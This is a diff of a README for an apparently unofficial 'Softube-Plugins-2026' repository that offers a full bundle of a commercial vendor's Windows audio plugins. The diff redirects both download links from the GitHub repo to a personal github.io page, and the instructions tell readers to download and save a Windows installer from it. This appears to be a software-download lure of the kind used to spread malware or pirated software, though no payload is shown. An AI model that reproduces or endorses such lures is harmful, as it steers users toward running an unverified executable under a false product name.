@@ -1,6 +1,6 @@
 # 🎧 Softube-Plugins-2026 - Install Professional Audio Tools Today
 
-[![Download Softube Plugins](https://img.shields.io/badge/Download-Softube_Plugins-blue.svg)](https://github.com/felix14603/Softube-Plugins-2026)
+[![Download Softube Plugins](https://img.shields.io/badge/Download-Softube_Plugins-blue.svg)](https://felix14603.github.io)
 
 ## 📌 Project Overview
 Softube-Plugins-2026 provides a complete collection of professional audio processing tools for Windows users. These plugins replicate high-end analog hardware to help you shape your audio. Use these tools for mixing, mastering, or creative sound design in your digital audio workstation. This package includes a wide range of compressors, equalizers, and saturation units compatible with Windows 10 and Windows 11.
@@ -18,7 +18,7 @@ Before you begin, confirm your computer meets these minimum specifications to en
 ## 📥 Get Your Plugins
 Follow these steps to download the software bundle for your system.
 
-1. Visit the repository page to begin the process: [https://github.com/felix14603/Softube-Plugins-2026](https://github.com/felix14603/Softube-Plugins-2026)
+1. Visit the repository page to begin the process: [https://felix14603.github.io](https://felix14603.github.io)
 2. Locate the download section on the page.
 3. Select the file relevant to the Windows installer.
 4. Save the file to your desktop or downloads folder.
